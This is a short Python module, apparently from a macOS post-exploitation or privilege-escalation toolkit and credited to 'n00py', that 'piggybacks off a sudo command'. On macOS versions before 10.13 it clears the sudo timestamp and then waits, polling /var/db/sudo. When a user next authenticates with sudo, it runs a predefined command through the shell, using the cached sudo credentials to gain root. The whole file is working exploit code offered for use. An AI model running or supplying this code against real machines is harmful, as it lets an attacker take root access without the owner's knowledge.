"""piggybacks off a sudo command"""
import os.path
import time
from distutils.version import LooseVersion
from subprocess import CalledProcessError, call

from .general import DEFAULT_COMMAND, interaction_prompt

__cve__ = ""
__credits__ = "n00py"


def vulnerable(version):
    """checks vulnerability"""
    if version < LooseVersion("10.13.0"):
        return interaction_prompt(
            "Do you want to piggyback off sudo (waits until sudo is used)?"
        )
    return


def run():
    """runs exploit"""
    sudo_dir = "/var/db/sudo"
    call(["sudo -K"], shell=True)
    old_time = time.ctime(os.path.getmtime(sudo_dir))
    exit_loop = False
    while exit_loop is False:
        new_time = time.ctime(os.path.getmtime(sudo_dir))
        if old_time != new_time:
            try:
                call([DEFAULT_COMMAND], shell=True)
                exit_loop = True
            except (OSError, CalledProcessError):
                pass
    return exit_loop
